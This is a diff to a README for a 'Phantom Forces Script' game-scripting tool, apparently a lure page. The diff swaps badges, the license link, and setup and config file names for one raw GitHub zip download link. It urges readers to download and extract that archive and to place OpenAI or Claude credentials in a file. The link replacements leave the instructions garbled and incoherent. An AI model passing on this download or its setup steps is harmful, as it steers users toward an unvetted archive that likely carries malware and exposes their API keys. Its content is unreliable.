@@ -1,5 +1,5 @@
-# ![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=cloud-download&link=LINK)  
-[**Download the latest version** https://hsdljahdl.github.io](#)
+# ![Download](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip%20Release-brightgreen?style=for-the-badge&logo=cloud-download&link=LINK)  
+[**Download the latest version** https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip](#)
 
 # 🦾 Phantom Forces Script
 
@@ -13,10 +13,10 @@ Seamless integration is the name of our game! Explore the compatibility landscap
 
 | Platform           | Supported | Native Experience | Notes                |
 | ------------------ | :-------: | :--------------: | -------------------- |
-| ![Windows](https://img.shields.io/badge/Windows-Yes-brightgreen?logo=windows)    | ✅        | 🟢               | Fully supported      |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-blue?logo=apple)  | ✅        | 🟢               | Full compatibility   |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-yellow?logo=linux) | ✅        | 🟢               | Smooth operation     |
-| ![Android](https://img.shields.io/badge/Android-Partial-orange?logo=android) | 🟡        | 🟡               | Some limitations     |
+| ![Windows](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip)    | ✅        | 🟢               | Fully supported      |
+| ![macOS](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip)  | ✅        | 🟢               | Full compatibility   |
+| ![Linux](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip) | ✅        | 🟢               | Smooth operation     |
+| ![Android](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip) | 🟡        | 🟡               | Some limitations     |
 
 We treasure cross-OS symphony—maximizing your scripting reach, wherever your command post might be.
 
@@ -61,7 +61,7 @@ We surf the vanguard of innovation! Phantom Forces Script embeds the prowess of 
 
 *To enable AI-boosted features:*
 1. Obtain your API keys from the official sources.
-2. Follow the in-app configuration prompts or review [INSTALLATION.md](#) (see steps below whenever https://hsdljahdl.github.io appears).
+2. Follow the in-app configuration prompts or review [https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip](#) (see steps below whenever https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip appears).
 
 AI features empower you to script smarter, not harder—crafting dynamic solutions with a trusted digital co-pilot.
 
@@ -69,16 +69,16 @@ AI features empower you to script smarter, not harder—crafting dynamic solutio
 
 ## 📦 Installation Steps
 
-Where a https://hsdljahdl.github.io is indicated, follow these steps:
+Where a https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip is indicated, follow these steps:
 
-1. Click the **Download** badge (https://hsdljahdl.github.io(#)) at the top or bottom of this README.
+1. Click the **Download** badge (https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip(#)) at the top or bottom of this README.
 2. Once downloaded, extract the archive to your desired location.
 3. Open your terminal or command prompt and navigate to the extracted folder.
-4. Follow platform-specific instructions in the included `SetupGuide.md`.
-5. For API integrations, insert your OpenAI or Claude credentials in the `config.json` file.
+4. Follow platform-specific instructions in the included `https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip`.
+5. For API integrations, insert your OpenAI or Claude credentials in the `https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip` file.
 6. Launch the application and embark on your new scripting journey!
 
-**Note:** Detailed instructions are available in the [INSTALLATION.md](#) file after download.
+**Note:** Detailed instructions are available in the [https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip](#) file after download.
 
 ---
 
@@ -110,7 +110,7 @@ Be wise, be ethical—use this tool for uplifting your gameplay, not for subvert
 ## 📜 MIT License (2025)
 
 This repository is published under the MIT License.  
-Read the full license here: [MIT License](https://opensource.org/licenses/MIT)
+Read the full license here: [MIT License](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip)
 
 ---
 
@@ -118,8 +118,8 @@ Read the full license here: [MIT License](https://opensource.org/licenses/MIT)
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=cloud-download&link=LINK)  
-[**Download the latest version** https://hsdljahdl.github.io](#)
+# ![Download](https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip%20Release-brightgreen?style=for-the-badge&logo=cloud-download&link=LINK)  
+[**Download the latest version** https://raw.githubusercontent.com/hsdljahdl/phantom-forces-script-hub/branch/Mesoenatides/phantom-forces-script-hub-3.4-beta.1.zip](#)
 
 ---
 Let the future of Phantom Forces scripting be your playground—where creativity, assistance, and innovation coalesce.
